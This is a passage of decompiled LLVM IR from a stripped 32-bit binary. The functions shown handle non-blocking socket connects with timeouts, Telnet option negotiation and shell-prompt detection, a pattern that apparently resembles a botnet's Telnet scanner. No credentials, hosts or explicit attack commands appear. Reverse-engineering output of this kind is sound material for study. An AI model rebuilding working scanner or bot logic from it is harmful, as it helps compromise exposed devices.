dec_label_pc_804976d:                             ; preds = %dec_label_pc_8049742, %dec_label_pc_804975f
  %stack_var_-32.1 = phi i8* [ %v22_804974e, %dec_label_pc_8049742 ], [ %stack_var_-32.0, %dec_label_pc_804975f ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_804977c

dec_label_pc_804977c:                             ; preds = %dec_label_pc_8049730, %dec_label_pc_804976d
  %storemerge = phi i32 [ -1, %dec_label_pc_8049730 ], [ %stack_var_-28.0, %dec_label_pc_804976d ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804975f, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_804974e, { 1, 0 }
  uselistorder i32 %v2_80495ec, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804977c, { 1, 0 }
  uselistorder label %dec_label_pc_804976d, { 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0 }
  uselistorder label %dec_label_pc_80496f5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049655, { 1, 0 }
}

define i32 @function_804978b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804978b:
  %stack_var_-4 = alloca i32, align 4
  %v0_804978b = load i32, i32* @ebp, align 4
  store i32 %v0_804978b, i32* %stack_var_-4, align 4
  %v4_804978b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804978b, i32* @ebp, align 4
  %v2_8049797 = call i32 @function_805232c(i32 %arg1)
  %v4_804979f = icmp eq i32 %v2_8049797, 0
  %v1_80497a3 = icmp eq i1 %v4_804979f, false
  br i1 %v1_80497a3, label %dec_label_pc_80497ba, label %dec_label_pc_80497a5

dec_label_pc_80497a5:                             ; preds = %dec_label_pc_804978b
  %v3_80497ac = call i32 @function_805224e(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a9dc.34, i32 0, i32 0))
  br label %dec_label_pc_804980d

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_804978b
  %v1_80497bd = add i32 %v2_8049797, 16
  %v2_80497bd = inttoptr i32 %v1_80497bd to i32*
  %v3_80497bd = load i32, i32* %v2_80497bd, align 4
  %v1_80497d3 = inttoptr i32 %v3_80497bd to i32*
  %v2_80497d3 = load i32, i32* %v1_80497d3, align 4
  %v1_80497d5 = icmp eq i32 %v2_80497d3, 0
  br i1 %v1_80497d5, label %dec_label_pc_804980d, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_80497ba
  %v2_80497e2 = load i32, i32* %v1_80497d3, align 4
  %v1_80497e4 = inttoptr i32 %v2_80497e2 to i32*
  %v2_80497e4 = load i32, i32* %v1_80497e4, align 4
  %v2_80497e9 = call i32 @function_80522ef(i32 %v2_80497e4)
  store i32 %arg2, i32* @eax, align 4
  %v4_80497f5 = inttoptr i32 %arg2 to i8*
  %v4_80497f8 = call i32 @function_8051edc(i8* %v4_80497f5, i32 %v2_80497e9)
  br label %dec_label_pc_804980d

dec_label_pc_804980d:                             ; preds = %dec_label_pc_80497ba, %dec_label_pc_80497d9, %dec_label_pc_80497a5
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_80497d9 ], [ 1, %dec_label_pc_80497a5 ], [ 1, %dec_label_pc_80497ba ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @function_80522ef, { 1, 0 }
  uselistorder i32 (i32)* @function_805232c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804980d, { 1, 0, 2 }
}

define i32 @function_8049812(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049812:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_8049832 = call i32 @function_8050a3c(i32 %arg1, i32 3, i32 0)
  %v4_804983a = or i32 %v3_8049832, 2048
  %v3_8049856 = call i32 @function_8050a3c(i32 %arg1, i32 4, i32 %v4_804983a)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_804986a = trunc i32 %arg3 to i16
  %v2_804986a = call i32 @function_8052210(i16 %v1_804986a)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049886 = call i32 @function_8049275(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_804988b = icmp eq i32 %v3_8049886, 0
  br i1 %v1_804988b, label %dec_label_pc_804989e, label %dec_label_pc_8049a0e

dec_label_pc_804989e:                             ; preds = %dec_label_pc_8049812
  %v2_8049879 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80498c6 = call i32 @function_8052690(i32 %arg1, i32 %v2_8049879, i32 16)
  %v5_80498ce = icmp slt i32 %v3_80498c6, 0
  %v1_80498d2 = icmp eq i1 %v5_80498ce, false
  br i1 %v1_80498d2, label %dec_label_pc_80499c5, label %dec_label_pc_80498d8

dec_label_pc_80498d8:                             ; preds = %dec_label_pc_804989e
  %v1_80498d8 = call i32 @function_8050f90(i32 %v3_80498c6)
  %v1_80498dd = inttoptr i32 %v1_80498d8 to i32*
  %v2_80498dd = load i32, i32* %v1_80498dd, align 4
  %v9_80498df = icmp eq i32 %v2_80498dd, 115
  %v1_80498e2 = icmp eq i1 %v9_80498df, false
  br i1 %v1_80498e2, label %dec_label_pc_8049a0e, label %dec_label_pc_80498e8

dec_label_pc_80498e8:                             ; preds = %dec_label_pc_80498d8
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049905 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049905, i32* @edi, align 4
  %v5_804990c = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049919 = udiv i32 %arg1, 32
  %v1_804991f = urem i32 %arg1, 32
  %v0_8049922 = load i32, i32* @ebp, align 4
  %v2_8049922 = mul nuw nsw i32 %v2_8049919, 4
  %v3_8049922 = add nsw i32 %v2_8049922, -164
  %v4_8049922 = add i32 %v3_8049922, %v0_8049922
  %v5_8049922 = inttoptr i32 %v4_8049922 to i32*
  %v6_8049922 = load i32, i32* %v5_8049922, align 4
  %v9_8049922 = shl i32 1, %v1_804991f
  %v12_8049922 = or i32 %v6_8049922, %v9_8049922
  store i32 %v12_8049922, i32* %v5_8049922, align 4
  %v1_804992d = add i32 %arg1, 1
  %v2_804992e = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049955 = call i32 @function_8050e18(i32 %v1_804992d, i32 0, i32 %v2_8049905, i32 0, i32 %v2_804992e)
  %tmp28 = icmp slt i32 %v5_8049955, 1
  br i1 %tmp28, label %dec_label_pc_8049a0e, label %dec_label_pc_804995e

dec_label_pc_804995e:                             ; preds = %dec_label_pc_80498e8
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8049968 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8049972 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049992 = call i32 @function_80526e8(i32 %arg1, i32 1, i32 4, i32 %v2_8049972, i32 %v2_8049968)
  %v3_8049997 = load i32, i32* %stack_var_-184, align 4
  %v1_804999d = icmp eq i32 %v3_8049997, 0
  br i1 %v1_804999d, label %dec_label_pc_80499c5, label %dec_label_pc_8049a0e

dec_label_pc_80499c5:                             ; preds = %dec_label_pc_804995e, %dec_label_pc_804989e
  %v3_80499db = call i32 @function_8050a3c(i32 %arg1, i32 3, i32 0)
  %v4_80499e3 = and i32 %v3_80499db, -2049
  %v3_80499ff = call i32 @function_8050a3c(i32 %arg1, i32 4, i32 %v4_80499e3)
  br label %dec_label_pc_8049a0e

dec_label_pc_8049a0e:                             ; preds = %dec_label_pc_80498d8, %dec_label_pc_80498e8, %dec_label_pc_804995e, %dec_label_pc_8049812, %dec_label_pc_80499c5
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_80499c5 ], [ 0, %dec_label_pc_8049812 ], [ 0, %dec_label_pc_804995e ], [ 0, %dec_label_pc_80498e8 ], [ 0, %dec_label_pc_80498d8 ]
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049a0e, { 4, 2, 1, 0, 3 }
}

define i32 @function_8049a1d() local_unnamed_addr {
dec_label_pc_8049a1d:
  %v0_8049a20 = load i32, i32* @ebx, align 4
  %v1_8049a24 = call i32 @function_8050bc4(i32 %v0_8049a20)
  %v4_8049a2c = icmp eq i32 %v1_8049a24, 0
  %v1_8049a30 = icmp eq i1 %v4_8049a2c, false
  br i1 %v1_8049a30, label %dec_label_pc_8049a3d, label %dec_label_pc_8049a32

dec_label_pc_8049a32:                             ; preds = %dec_label_pc_8049a1d
  br label %dec_label_pc_8049b19

dec_label_pc_8049a3d:                             ; preds = %dec_label_pc_8049a1d
  %v0_8049a3d = load i32, i32* @global_var_805e8c8.35, align 8
  %v0_8049a42 = load i32, i32* @global_var_805e8cc.36, align 4
  %v1_8049a48 = add i32 %v0_8049a3d, 1
  %v5_8049a48 = icmp eq i32 %v0_8049a3d, -1
  %v2_8049a4b = zext i1 %v5_8049a48 to i32
  %v3_8049a4b = add i32 %v2_8049a4b, %v0_8049a42
  store i32 %v1_8049a48, i32* @global_var_805e8c8.35, align 8
  store i32 %v3_8049a4b, i32* @global_var_805e8cc.36, align 4
  %v2_8049a68 = mul i32 %v1_8049a48, 4
  %v1_8049a6b = add i32 %v2_8049a68, 4
  %v1_8049a71 = call i32 @function_80529ba(i32 %v1_8049a6b)
  br label %dec_label_pc_8049aa4

dec_label_pc_8049a82:                             ; preds = %dec_label_pc_8049aa4, %dec_label_pc_8049ad5
  %v2_8049a85 = mul i32 %storemerge1, 4
  %v5_8049a8a = add i32 %v2_8049a85, %v1_8049a71
  %v0_8049a95 = load i32, i32* @global_var_8064b54.37, align 4
  %v2_8049a9a = add i32 %v0_8049a95, %v2_8049a85
  %v1_8049a9d = inttoptr i32 %v2_8049a9a to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  %v2_8049a9f = inttoptr i32 %v5_8049a8a to i32*
  store i32 %v2_8049a9d, i32* %v2_8049a9f, align 4
  %v4_8049aa1 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049aa4

dec_label_pc_8049aa4:                             ; preds = %dec_label_pc_8049a3d, %dec_label_pc_8049a82
  %storemerge1 = phi i32 [ %v4_8049aa1, %dec_label_pc_8049a82 ], [ 0, %dec_label_pc_8049a3d ]
  %v0_8049ab2 = load i32, i32* @global_var_805e8c8.35, align 8
  %v0_8049ab7 = load i32, i32* @global_var_805e8cc.36, align 4
  %v4_8049ac1 = icmp ne i32 %v0_8049ab2, 0
  %v2_8049ac4 = zext i1 %v4_8049ac1 to i32
  %v3_8049ac4 = add i32 %v0_8049ab7, -1
  %v4_8049ac4 = add i32 %v3_8049ac4, %v2_8049ac4
  store i32 %v4_8049ac4, i32* @ebx, align 4
  %v10_8049ad0 = icmp eq i32 %v4_8049ac4, 0
  br i1 %v10_8049ad0, label %dec_label_pc_8049ad5, label %dec_label_pc_8049a82

dec_label_pc_8049ad5:                             ; preds = %dec_label_pc_8049aa4
  %v1_8049ac1 = add i32 %v0_8049ab2, -1
  %v10_8049ae0 = icmp ult i32 %storemerge1, %v1_8049ac1
  br i1 %v10_8049ae0, label %dec_label_pc_8049a82, label %dec_label_pc_8049ae5

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8049ad5
  %v2_8049af0 = mul i32 %v0_8049ab2, 4
  %v5_8049af3 = add i32 %v2_8049af0, %v1_8049a71
  %v1_8049af6 = add i32 %v5_8049af3, -4
  %v2_8049afc = inttoptr i32 %v1_8049af6 to i32*
  store i32 %v1_8049a24, i32* %v2_8049afc, align 4
  %v0_8049afe = load i32, i32* @global_var_8064b54.37, align 4
  %v1_8049b06 = call i32 @function_8053391(i32 %v0_8049afe)
  store i32 %v1_8049a71, i32* @global_var_8064b54.37, align 4
  br label %dec_label_pc_8049b19

dec_label_pc_8049b19:                             ; preds = %dec_label_pc_8049a32, %dec_label_pc_8049ae5
  ret i32 %v1_8049a24

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049a85, { 1, 0 }
  uselistorder i32 %v1_8049a71, { 2, 0, 1 }
  uselistorder i32 %v0_8049a3d, { 1, 0 }
  uselistorder label %dec_label_pc_8049b19, { 1, 0 }
  uselistorder label %dec_label_pc_8049aa4, { 1, 0 }
  uselistorder label %dec_label_pc_8049a82, { 1, 0 }
}

define i32 @function_8049b22(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8049b22:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b22 = load i32, i32* @ebp, align 4
  store i32 %v0_8049b22, i32* %stack_var_-4, align 4
  %v1_8049b2b = add i32 %arg2, 1
  %v1_8049b2c = inttoptr i32 %v1_8049b2b to i8*
  %v2_8049b2c = load i8, i8* %v1_8049b2c, align 1
  %v9_8049b35 = icmp ult i8 %v2_8049b2c, -5
  br i1 %v9_8049b35, label %dec_label_pc_8049c40, label %dec_label_pc_8049b42

dec_label_pc_8049b42:                             ; preds = %dec_label_pc_8049b22
  %v7_8049b49 = icmp eq i8 %v2_8049b2c, -1
  br i1 %v7_8049b49, label %dec_label_pc_8049b4b, label %dec_label_pc_8049b65

dec_label_pc_8049b4b:                             ; preds = %dec_label_pc_8049b42
  br label %dec_label_pc_8049c40

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b42
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_8049b79 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049b86 = call i32 @function_8052758(i32 %arg1, i32 %v2_8049b79, i32 1, i32 16384)
  %v2_8049b8f = load i8, i8* %v1_8049b2c, align 1
  %v11_8049b92 = icmp eq i8 %v2_8049b8f, -4
  %v1_8049b94 = icmp eq i1 %v11_8049b92, false
  br i1 %v1_8049b94, label %dec_label_pc_8049b9c, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b65
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049bf2

dec_label_pc_8049b9c:                             ; preds = %dec_label_pc_8049b65
  %v2_8049ba0 = load i8, i8* %v1_8049b2c, align 1
  %v11_8049ba3 = icmp eq i8 %v2_8049ba0, -2
  %v1_8049ba5 = icmp eq i1 %v11_8049ba3, false
  br i1 %v1_8049ba5, label %dec_label_pc_8049bad, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b9c
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049bf2

dec_label_pc_8049bad:                             ; preds = %dec_label_pc_8049b9c
  %v2_8049bb1 = load i8, i8* %v1_8049b2c, align 1
  %v10_8049bb4 = icmp eq i8 %v2_8049bb1, 3
  %v1_8049bb6 = icmp eq i1 %v10_8049bb4, false
  %v11_8049bdd = icmp eq i8 %v2_8049bb1, -3
  %v1_8049bdf = icmp eq i1 %v11_8049bdd, false
  br i1 %v1_8049bb6, label %dec_label_pc_8049bd6, label %dec_label_pc_8049bb8

dec_label_pc_8049bb8:                             ; preds = %dec_label_pc_8049bad
  %. = select i1 %v1_8049bdf, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049bf2

dec_label_pc_8049bd6:                             ; preds = %dec_label_pc_8049bad
  %.3 = select i1 %v1_8049bdf, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049bf2

dec_label_pc_8049bf2:                             ; preds = %dec_label_pc_8049bb8, %dec_label_pc_8049ba7, %dec_label_pc_8049b96, %dec_label_pc_8049bd6
  %v4_8049c0f = call i32 @function_8052758(i32 %arg1, i32 %v2_8049b79, i32 1, i32 16384)
  %v1_8049c17 = add i32 %arg2, 2
  %v4_8049c34 = call i32 @function_8052758(i32 %arg1, i32 %v1_8049c17, i32 1, i32 16384)
  %v2_8049c43.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049c40

dec_label_pc_8049c40:                             ; preds = %dec_label_pc_8049b4b, %dec_label_pc_8049bf2, %dec_label_pc_8049b22
  %v2_8049c43 = phi i32 [ %v0_8049b22, %dec_label_pc_8049b4b ], [ %v2_8049c43.pre, %dec_label_pc_8049bf2 ], [ %v0_8049b22, %dec_label_pc_8049b22 ]
  store i32 %v2_8049c43, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049c40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049bf2, { 3, 0, 1, 2 }
}

define i32 @function_8049c45(i8* %arg1) local_unnamed_addr {
dec_label_pc_8049c45:
  %v4_8049c53 = ptrtoint i8* %arg1 to i32
  %v3_8049c64 = call i32 @_strlen(i8* %arg1)
  %v4_8049c64 = mul i32 %v3_8049c64, -1
  %v1_8049c6a = sub i32 0, %v4_8049c64
  %v6_8049c91 = sub i32 %v4_8049c53, %v4_8049c64
  br label %dec_label_pc_8049d19

dec_label_pc_8049c81:                             ; preds = %dec_label_pc_8049cd4, %dec_label_pc_8049cbc, %dec_label_pc_8049ca4, %dec_label_pc_8049c8c
  %v4_8049c81 = add nsw i32 %stack_var_-12.032, 1
  %v7_8049c8a = icmp slt i32 %v4_8049c81, %v1_8049c6a
  br i1 %v7_8049c8a, label %dec_label_pc_8049c8c, label %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge

dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge: ; preds = %dec_label_pc_8049c81, %dec_label_pc_8049c84.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049c84.preheader ], [ %v4_8049c81, %dec_label_pc_8049c81 ]
  %.pre = sub i32 %v6_8049c91, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049cec

dec_label_pc_8049c8c:                             ; preds = %dec_label_pc_8049c84.preheader, %dec_label_pc_8049c81
  %stack_var_-12.032 = phi i32 [ %v4_8049c81, %dec_label_pc_8049c81 ], [ %stack_var_-12.1, %dec_label_pc_8049c84.preheader ]
  %v2_8049c99 = sub i32 %v6_8049c91, %stack_var_-12.032
  %v1_8049c9d = inttoptr i32 %v2_8049c99 to i8*
  %v2_8049c9d = load i8, i8* %v1_8049c9d, align 1
  %v4_8049ca0 = icmp eq i8 %v2_8049c9d, 0
  br i1 %v4_8049ca0, label %dec_label_pc_8049c81, label %dec_label_pc_8049ca4

dec_label_pc_8049ca4:                             ; preds = %dec_label_pc_8049c8c
  %v2_8049cb5 = load i8, i8* %v1_8049c9d, align 1
  %v7_8049cb8 = icmp eq i8 %v2_8049cb5, 32
  br i1 %v7_8049cb8, label %dec_label_pc_8049c81, label %dec_label_pc_8049cbc

dec_label_pc_8049cbc:                             ; preds = %dec_label_pc_8049ca4
  %v2_8049ccd = load i8, i8* %v1_8049c9d, align 1
  %v10_8049cd0 = icmp eq i8 %v2_8049ccd, 13
  br i1 %v10_8049cd0, label %dec_label_pc_8049c81, label %dec_label_pc_8049cd4

dec_label_pc_8049cd4:                             ; preds = %dec_label_pc_8049cbc
  %v2_8049ce5 = load i8, i8* %v1_8049c9d, align 1
  %v10_8049ce8 = icmp eq i8 %v2_8049ce5, 10
  br i1 %v10_8049ce8, label %dec_label_pc_8049c81, label %dec_label_pc_8049cec

dec_label_pc_8049cec:                             ; preds = %dec_label_pc_8049cd4, %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge ], [ %stack_var_-12.032, %dec_label_pc_8049cd4 ]
  %v1_8049cfd.pre-phi = phi i8* [ %.pre10, %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge ], [ %v1_8049c9d, %dec_label_pc_8049cd4 ]
  %v2_8049cfd = load i8, i8* %v1_8049cfd.pre-phi, align 1
  %v6_8049d03 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_805a9ea.38 to i32)
  %v1_8049d06 = inttoptr i32 %v6_8049d03 to i8*
  %v2_8049d06 = load i8, i8* %v1_8049d06, align 1
  %v15_8049d09 = icmp eq i8 %v2_8049cfd, %v2_8049d06
  %v1_8049d0b = icmp eq i1 %v15_8049d09, false
  br i1 %v1_8049d0b, label %dec_label_pc_8049d16, label %dec_label_pc_8049d43

dec_label_pc_8049d16:                             ; preds = %dec_label_pc_8049cec
  %v4_8049d16 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049d19

dec_label_pc_8049d19:                             ; preds = %dec_label_pc_8049c45, %dec_label_pc_8049d16
  %stack_var_-12.1 = phi i32 [ 0, %dec_label_pc_8049c45 ], [ %stack_var_-12.023, %dec_label_pc_8049d16 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8049c45 ], [ %v4_8049d16, %dec_label_pc_8049d16 ]
  %v3_8049d2d = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9ea.38, i32 0, i32 0))
  %v7_8049d34 = icmp ult i32 %storemerge3, %v3_8049d2d
  br i1 %v7_8049d34, label %dec_label_pc_8049c84.preheader, label %dec_label_pc_8049d43

dec_label_pc_8049c84.preheader:                   ; preds = %dec_label_pc_8049d19
  %v7_8049c8a31 = icmp slt i32 %stack_var_-12.1, %v1_8049c6a
  br i1 %v7_8049c8a31, label %dec_label_pc_8049c8c, label %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge

dec_label_pc_8049d43:                             ; preds = %dec_label_pc_8049d19, %dec_label_pc_8049cec
  %storemerge = phi i32 [ 1, %dec_label_pc_8049cec ], [ 0, %dec_label_pc_8049d19 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049c91, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805a9ea.38, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049d19, { 1, 0 }
  uselistorder label %dec_label_pc_8049c84.dec_label_pc_8049cec_crit_edge, { 1, 0 }
}

define i32 @function_8049d4c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8049d4c:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049d92 = ptrtoint i32* %stack_var_-160 to i32
  %tmp28 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049dac = urem i32 %arg1, 32
  %v9_8049daf = shl i32 1, %v1_8049dac
  %v1_8049dba = add i32 %arg1, 1
  %v2_8049dbb = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049df2 = ptrtoint i8* %arg6 to i32
  %v2_8049ec6 = inttoptr i32 %arg2 to i8*
  %v4_8049ecf = icmp eq i32 %arg3, 0
  %v1_8049ef035 = add i32 %arg8, 2
  %v5_8049ef643 = icmp slt i32 %v1_8049ef035, %arg7
  br i1 %v5_8049ef643, label %dec_label_pc_8049ef8.lr.ph, label %dec_label_pc_8049f14

dec_label_pc_8049ef8.lr.ph:                       ; preds = %dec_label_pc_8049d4c
  %v2_8049da6 = udiv i32 %arg1, 32
  %v2_8049daf = mul nuw nsw i32 %v2_8049da6, 4
  %v3_8049daf = add nsw i32 %v2_8049daf, -156
  %tmp32 = icmp slt i32 %arg5, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br label %dec_label_pc_8049ef8

dec_label_pc_8049d88:                             ; preds = %dec_label_pc_8049f06, %dec_label_pc_8049ef8
  store i32 %v2_8049d92, i32* @edi, align 4
  %v5_8049d99 = call i8* @_memset(i8* %tmp28, i32 0, i32 32)
  %v0_8049daf = load i32, i32* @ebp, align 4
  %v4_8049daf = add i32 %v3_8049daf, %v0_8049daf
  %v5_8049daf = inttoptr i32 %v4_8049daf to i32*
  %v6_8049daf = load i32, i32* %v5_8049daf, align 4
  %v12_8049daf = or i32 %v6_8049daf, %v9_8049daf
  store i32 %v12_8049daf, i32* %v5_8049daf, align 4
  %v5_8049de2 = call i32 @function_8050e18(i32 %v1_8049dba, i32 %v2_8049d92, i32 0, i32 0, i32 %v2_8049dbb)
  %tmp29 = icmp slt i32 %v5_8049de2, 1
  br i1 %tmp29, label %dec_label_pc_8049f14, label %dec_label_pc_8049def

dec_label_pc_8049def:                             ; preds = %dec_label_pc_8049d88
  %v6_8049df2 = add i32 %stack_var_-32.044, %v5_8049df2
  %v5_8049df5 = inttoptr i32 %v6_8049df2 to i8*
  %v4_8049e15 = call i32 @function_8052724(i32 %arg1, i32 %v6_8049df2, i32 1, i32 0)
  %v13_8049e1d = icmp eq i32 %v4_8049e15, -1
  br i1 %v13_8049e1d, label %dec_label_pc_8049f30, label %dec_label_pc_8049e23

dec_label_pc_8049e23:                             ; preds = %dec_label_pc_8049def
  %v4_8049e23 = icmp eq i32 %v4_8049e15, 0
  %v1_8049e27 = icmp eq i1 %v4_8049e23, false
  br i1 %v1_8049e27, label %dec_label_pc_8049e38, label %dec_label_pc_8049f30

dec_label_pc_8049e38:                             ; preds = %dec_label_pc_8049e23
  %v5_8049e3b = add i32 %v4_8049e15, %stack_var_-32.044
  %v2_8049e41 = load i8, i8* %v5_8049df5, align 1
  %v11_8049e44 = icmp eq i8 %v2_8049e41, -1
  %v1_8049e46 = icmp eq i1 %v11_8049e44, false
  br i1 %v1_8049e46, label %dec_label_pc_8049eb9, label %dec_label_pc_8049e48

dec_label_pc_8049e48:                             ; preds = %dec_label_pc_8049e38
  %v1_8049e4b = add i32 %v6_8049df2, 1
  %v4_8049e66 = call i32 @function_8052724(i32 %arg1, i32 %v1_8049e4b, i32 2, i32 0)
  %v13_8049e6e = icmp eq i32 %v4_8049e66, -1
  br i1 %v13_8049e6e, label %dec_label_pc_8049f30, label %dec_label_pc_8049e74

dec_label_pc_8049e74:                             ; preds = %dec_label_pc_8049e48
  %v4_8049e74 = icmp eq i32 %v4_8049e66, 0
  %v1_8049e78 = icmp eq i1 %v4_8049e74, false
  br i1 %v1_8049e78, label %dec_label_pc_8049e89, label %dec_label_pc_8049f30

dec_label_pc_8049e89:                             ; preds = %dec_label_pc_8049e74
  %v5_8049e8c = add i32 %v4_8049e66, %v5_8049e3b
  %v3_8049ea4 = call i32 @function_8049b22(i32 %arg1, i32 %v6_8049df2, i32 3)
  %v1_8049ea9 = icmp eq i32 %v3_8049ea4, 0
  %v1_8049eab = icmp eq i1 %v1_8049ea9, false
  br i1 %v1_8049eab, label %dec_label_pc_8049eed.backedge, label %dec_label_pc_8049f30

dec_label_pc_8049eed.backedge:                    ; preds = %dec_label_pc_8049e89, %dec_label_pc_8049ecf, %dec_label_pc_8049ed5
  %stack_var_-32.0.be = phi i32 [ %v5_8049e3b, %dec_label_pc_8049ecf ], [ %v5_8049e3b, %dec_label_pc_8049ed5 ], [ %v5_8049e8c, %dec_label_pc_8049e89 ]
  %v1_8049ef0 = add i32 %stack_var_-32.0.be, 2
  %v5_8049ef6 = icmp slt i32 %v1_8049ef0, %arg7
  br i1 %v5_8049ef6, label %dec_label_pc_8049eed.backedge.dec_label_pc_8049ef8_crit_edge, label %dec_label_pc_8049f14

dec_label_pc_8049eed.backedge.dec_label_pc_8049ef8_crit_edge: ; preds = %dec_label_pc_8049eed.backedge
  %v3_8049ef8.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049ef8

dec_label_pc_8049eb9:                             ; preds = %dec_label_pc_8049e38
  %v3_8049ec6 = call i32 @function_8051f50(i32 %v5_8049df2, i8* %v2_8049ec6)
  %v1_8049ecb = icmp eq i32 %v3_8049ec6, 0
  %v1_8049ecd = icmp eq i1 %v1_8049ecb, false
  br i1 %v1_8049ecd, label %dec_label_pc_8049f14, label %dec_label_pc_8049ecf

dec_label_pc_8049ecf:                             ; preds = %dec_label_pc_8049eb9
  br i1 %v4_8049ecf, label %dec_label_pc_8049eed.backedge, label %dec_label_pc_8049ed5

dec_label_pc_8049ed5:                             ; preds = %dec_label_pc_8049ecf
  %v2_8049edb = call i32 @function_8049c45(i8* %arg6)
  %v1_8049ee0 = icmp eq i32 %v2_8049edb, 0
  br i1 %v1_8049ee0, label %dec_label_pc_8049eed.backedge, label %dec_label_pc_8049f14

dec_label_pc_8049ef8:                             ; preds = %dec_label_pc_8049eed.backedge.dec_label_pc_8049ef8_crit_edge, %dec_label_pc_8049ef8.lr.ph
